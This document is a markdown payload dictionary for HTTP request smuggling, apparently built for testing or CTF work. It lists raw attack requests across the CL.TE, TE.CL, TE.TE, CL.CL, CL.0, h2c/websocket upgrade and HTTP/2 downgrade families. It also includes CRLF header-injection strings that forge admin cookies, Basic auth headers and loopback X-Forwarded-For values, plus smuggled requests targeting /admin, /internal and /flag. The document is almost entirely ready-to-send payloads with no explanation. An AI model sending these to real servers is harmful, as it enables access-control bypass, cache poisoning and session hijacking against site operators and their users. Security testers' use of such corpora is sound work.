# Payload dictionary — the smuggle corpus

## CL.TE — the front-CL back-TE family

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

0

GET / HTTP/1.1
```

## TE.CL — the front-TE back-CL family

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /internal HTTP/1.1
Host: t
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## TE.TE — the obfuscated-TE family

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GET /404 HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding : chunked

5c
GET /404 HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

## CL.CL — the duplicate-CL family

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Content-Length: 7

A=1&B=2
```

## CL.0 — the body-ignored family

```text
POST /redirect HTTP/1.1
Host: t
Content-Length: 45

GET /admin HTTP/1.1
Host: t
Foo: x
```

## CRLF folds — the header/body split

```text
?host=ex.com%0d%0aX-Injected:%201
?host=ex.com%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
?host=ex.com%0d%0aHost:%20internal
?host=ex.com%0d%0aCookie:%20admin=1
?host=ex.com%0d%0aAuthorization:%20Basic%20YWRtaW46YWRtaW4=
?host=ex.com%0d%0aX-Forwarded-For:%20127.0.0.1
?name=%0d%0aSet-Cookie:%20admin=1
?name=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<html>x</html>
?host=ex.com%250d%250aX-Inj:%201    — double-encoded
?host=ex.com%e5%98%8aX-Inj:%201     — multibyte LF
?host=ex.com%0aX-Inj:%201           — LF only
?host=ex.com%0dX-Inj:%201           — CR only
?host=ex.com%0d%0a%20X-Inj:%201     — obs-fold continuation
```

## Upgrade smuggles — `Upgrade: websocket` / `h2c`

```text
GET /ws HTTP/1.1
Host: t
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x
Sec-WebSocket-Version: 13
```

```text
GET / HTTP/1.1
Host: t
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

```text
CONNECT internal:80 HTTP/1.1
Host: t
```

## h2 smuggles — the downgrade family

```text
:method POST
:path /
:authority t
content-length 0
```

```text
:method POST
:path /
:authority t
transfer-encoding chunked
```

```text
:method GET
:path /?q=x HTTP/1.1\r\nHost: internal\r\n\r\nGET /admin
:authority t
```

## Readback smuggles — the stored-param

```text
POST /store HTTP/1.1
Host: t
Content-Length: 400

x=
```

```text
POST /search?q=x HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /search?q=POISONED HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

## Internal-route smuggles — the `/admin` family

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: internal
X-Forwarded-For: 127.0.0.1
Content-Length: 15

x=1
0
```
